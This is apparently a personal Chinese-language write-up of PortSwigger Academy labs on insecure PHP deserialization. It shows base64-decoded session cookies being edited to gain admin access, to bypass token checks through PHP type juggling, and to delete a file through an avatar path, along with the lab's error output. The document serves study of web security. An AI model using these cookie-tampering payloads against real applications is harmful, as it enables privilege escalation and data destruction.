---
title: Insecure deserialization
description: Insecure deserialization
---

## PHP serialization format

https://portswigger.net/web-security/deserialization/exploiting#php-serialization-format

## Java serialization format

https://portswigger.net/web-security/deserialization/exploiting#java-serialization-format

## Lab: Modifying serialized objects

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#modifying-object-attributes                      |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects |

登入後，看到 Cookie `session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=` (URL Decoded 版本)

```js
atob(
  "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=",
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

嘗試構造

```js
btoa(`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

塞回 Cookie.session，重整網頁，即可看到 Admin Panel～

## Lab: Modifying serialized data types

| Dimension | Description                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#modifying-data-types                                |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types |

PHP 的 `==` 有一些特殊的情境

```php
5 == "5" // true
5 == "5 of something" // true

// in PHP 7.x and earlier
0 == "Example string" // true
```

登入後，看 Cookie.session

```js
atob(
  `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2NzlnMXNrcHN0bWx2dm4xbDZ0NjI3ZWxqZXNxZHBtaCI7fQ==`,
);
// O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"v79g1skpstmlvvn1l6t627eljesqdpmh";}
```

參考 [function.serialize.php](https://www.php.net/manual/en/function.serialize.php) 修改成

```js
btoa(`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==
```

成功解題～

## Lab: Using application functionality to exploit insecure deserialization

| Dimension | Description                                                                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#using-application-functionality                                                         |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization |

嘗試

```js
atob(
  `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkenh6MHB2eTd1ZDhqZnZneDAwczI1MjdtZHBxY2htaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=`,
);
// O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dzxz0pvy7ud8jfvgx00s2527mdpqchmh";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

改成

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dzxz0pvy7ud8jfvgx00s2527mdpqchmh";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkenh6MHB2eTd1ZDhqZnZneDAwczI1MjdtZHBxY2htaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

然後刪除帳號，可惜沒成功，還好還有另一組帳密可以用，登入後嘗試

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";i:0;s:11:"avatar_link";s:19:"users/carlos/avatar";}'`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30n
```

看到

```
PHP Fatal error: Uncaught Exception: (DEBUG: $access_tokens[$user->username] = e82ar2z914858ch6cqdugqpycrouj8qz, $user->access_token = 0, $access_tokens = [e82ar2z914858ch6cqdugqpycrouj8qz, gi9luj09fotgyfceggc3sfezlydykp0k, dzxz0pvy7ud8jfvgx00s2527mdpqchmh]) Invalid access token for user carlos in /var/www/index.php:8 Stack trace: #0 {main} thrown in /var/www/index.php on line 8
```

看一下目前登入的使用者

```js
atob(
  `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImdpOWx1ajA5Zm90Z3lmY2VnZ2Mzc2Zlemx5ZHlrcDBrIjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9`,
);
// O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"gi9luj09fotgyfceggc3sfezlydykp0k";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

推測 `e82ar2z914858ch6cqdugqpycrouj8qz` 應該是 carlos 的 access_token，嘗試

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"e82ar2z914858ch6cqdugqpycrouj8qz";s:11:"avatar_link";s:19:"users/carlos/avatar";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlODJhcjJ6OTE0ODU4Y2g2Y3FkdWdxcHljcm91ajhxeiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30=
```

重整後，被導回登入頁，但至少沒有噴錯了，再嘗試

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"e82ar2z914858ch6cqdugqpycrouj8qz";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlODJhcjJ6OTE0ODU4Y2g2Y3FkdWdxcHljcm91ajhxeiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
fetch(`${location.origin}/my-account/delete`, { method: "POST" });
```

看到錯誤

```html
Internal Server Error PHP Warning: file_put_contents(users/carlos/disabled):
failed to open stream: No such file or directory in /home/carlos/User.php on
line 45 PHP Fatal error: Uncaught Exception: Could not write to
users/carlos/disabled in /home/carlos/User.php:46 Stack trace: #0 Command line
code(5): User->delete() #1 {main} thrown in /home/carlos/User.php on line 46
```

剛才被導回登入頁，其實是因為我網址沒換，改成 https://0a880087032ab8d38411189b007500e1.web-security-academy.net/my-account?id=carlos 就可以成功看到 carlos 的帳號

用 carlos 的帳號上傳照片後，再刪除帳號，還是沒辦法解題，感覺就差臨門一腳了，忍住不要看答案～但既然 carlos 的帳號被我刪掉，應該就只能重啟 Lab 了QQ

- 從錯誤訊息 `No such file or directory in /home/carlos/User.php`
- Lab 的 Description `delete the morale.txt file from Carlos's home directory`
- 推測應該要改為 `/home/carlos/morale.txt`

```js
btoa(
  `O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"payia0hddvlpxag6yunxxwfzm1c48cgl";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`,
);
// Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwYXlpYTBoZGR2bHB4YWc2eXVueHh3ZnptMWM0OGNnbCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

成功解題～

## Magic methods

https://portswigger.net/web-security/deserialization/exploiting#magic-methods

invoked whenever an object of the class is instantiated

- PHP => `__construct()`
- Python => `__init__`

invoked automatically during the deserialization process

- PHP => `__wakeup()`
- Java => `ObjectInputStream.readObject()`

## Lab: Arbitrary object injection in PHP

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#injecting-arbitrary-objects                           |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php |

## 參考資料

- https://portswigger.net/web-security/deserialization
